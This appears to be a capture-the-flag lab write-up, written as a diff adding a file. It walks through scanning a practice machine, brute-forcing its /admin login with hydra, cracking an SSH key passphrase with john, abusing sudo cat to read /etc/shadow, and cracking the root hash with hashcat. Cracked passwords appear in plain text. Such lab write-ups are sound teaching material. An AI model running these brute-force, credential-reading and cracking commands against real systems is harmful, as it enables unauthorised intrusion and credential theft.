@@ -1,0 +1,100 @@
+as always started with rustscan and got some open ports
+
+Open 10.10.255.112:80
+Open 10.10.255.112:22
+
+two open ports started with nmap scan and got some results
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDddsKhK0u67HTcGJWVdm5ukT2hHzo8pDwrqJmqffotf3+4uTESTdRdr2UgZhPD5ZAvVubybTc5HSVOA+CQ6eWzlmX1LDU3lsxiWEE1RF9uOVk3Kimdxp/DI8ILcJJdQlq9xywZvDZ5wwH+zxGB+mkq1i8OQuUR+0itCWembOAj1NvF4DIplYfNbbcw1qPvZgo0dA+WhPLMchn/S8T5JMFDEvV4TzhVVJM26wfBi4o0nslL9MhM74XGLvafSa5aG+CL+xrtp6oJY2wPdCSQIFd9MVVJzCYuEJ1k4oLMU1zDhANaSiScpEVpfJ4HqcdW+zFq2YAhD1a8CsAxXfMoWowd
+|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPHLT8mfzU6W6p9tclAb0wb1hYKmdoAKKAqjLG8JrBEUZdFSBnCj8VOeaEuT6anMLidmNO06RAokva3MnWGoys=
+|   256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoIlLiatGPnlVn/NBlNWJziqMNrvbNTI5+JbhICdZ6/
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+after that started a gobuster scan on the website and got a dir named admin
+
+gobuster dir -u http://ip -w wordlist
+
+/admin
+
+after that visited that dir and it was a loggin page! i visited the source code of the website and saw this comment!
+ 
+     <!-- Hey john, if you do not remember, the username is admin -->
+     
+after seeing this i though of bruteforcing the login page as the machine name is brutit!
+
+basic syntax of hydra is :
+
+hydra -l elliot -P ~/Desktop/fsocity.txt 10.10.52.89 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.52.89%2Fwp-admin%2F&testcookie=1:S=302" -f
+
+command i used to bruteforce the login page!
+
+hydra -l admin -P ~/Desktop/payloads/wordlist/rockyou.txt 10.10.255.112 http-post-form "/admin/:user=^USER^&pass=^PASS^:S=302" -f -Vv -t54 -I
+
+-l is username
+-P is for wordist
+
+10.10.255.112 is the ip address you want to attack
+http-post-form is the type of page you wanna attack
+"/admin/: the dir
+affter that it is the request that you will made! you can see this request from the network
+section of the browser and see the request!
+
+[80][http-post-form] host: 10.10.255.112   login: admin   password: xavier
+
+
+logged in into the machine and got the ssh private key
+
+tried to login into the ssh using the key but was unsuccessful
+
+we have to change the permissions of the key to make it secure
+
+chmod 400 id_rsa
+
+after that it asks for a passphrase when we try to login
+you can easily crack the passphrase using john
+
+python2 ssh2john.py id_rsa > id_rsa.hash
+
+after that just do
+
+john --wordlist=rockyou.txt id_rsa.hash
+
+i prefer rockyou as it will take less amount of time than the default wordlist
+this will take some time to crack the passphrase
+
+i got the passphrase :  rockinroll
+
+after that i logged in into the macchine and checked the
+sudo -l
+and saw that john have perms to use /bin/cat with sudo perms
+
+so i just  cat out the root flag with cat 
+sudo cat /root/root.txt
+
+
+
+now how to get the root user! just cat out the /etc/shadow file save the root password hash in you pc and use hashcat at -m 1800 to crack it
+
+hashcat -m 1800 -a 0 brute.rootpass rockyou.txt -t64
+
+the password cracked in seconds :  football
+
+
+cheers for the root user!
+
+
+
+
+
